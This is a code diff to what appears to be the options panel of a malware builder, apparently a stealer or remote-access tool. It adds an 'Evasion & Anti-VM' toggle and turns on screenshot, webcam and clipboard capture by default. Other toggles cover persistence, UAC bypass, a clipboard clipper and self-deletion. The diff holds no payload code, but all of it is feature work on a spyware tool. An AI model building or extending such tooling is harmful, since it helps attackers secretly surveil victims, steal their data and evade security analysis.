@@ -37,6 +37,7 @@
     captureClipboard?: boolean;
     persistence?: boolean;
     uacBypass?: boolean;
+    evasion?: boolean;
     clipper?: boolean;
     melt?: boolean;
     onToggleScreenshots?: () => void;
@@ -44,6 +45,7 @@
     onToggleClipboard?: () => void;
     onTogglePersistence?: () => void;
     onToggleUacBypass?: () => void;
+    onToggleEvasion?: () => void;
     onToggleClipper?: () => void;
     onToggleMelt?: () => void;
   };
@@ -54,11 +56,12 @@
     selectedCategoryCount = 0,
     toggleCategory = () => undefined,
     showToast = () => undefined,
-    captureScreenshots = false,
-    captureWebcams = false,
-    captureClipboard = false,
+    captureScreenshots = true,
+    captureWebcams = true,
+    captureClipboard = true,
     persistence = false,
     uacBypass = false,
+    evasion = true,
     clipper = false,
     melt = false,
     onToggleScreenshots = () => undefined,
@@ -66,6 +69,7 @@
     onToggleClipboard = () => undefined,
     onTogglePersistence = () => undefined,
     onToggleUacBypass = () => undefined,
+    onToggleEvasion = () => undefined,
     onToggleClipper = () => undefined,
     onToggleMelt = () => undefined,
   }: Props = $props();
@@ -99,6 +103,7 @@
     { label: "Clipboard", checked: captureClipboard, toggle: onToggleClipboard },
     { label: "Persistence", checked: persistence, toggle: onTogglePersistence },
     { label: "UAC Bypass", checked: uacBypass, toggle: onToggleUacBypass },
+    { label: "Evasion & Anti-VM", checked: evasion, toggle: onToggleEvasion },
     { label: "Clipper", checked: clipper, toggle: onToggleClipper },
     { label: "Self-Delete (Melt)", checked: melt, toggle: onToggleMelt },
   ]);
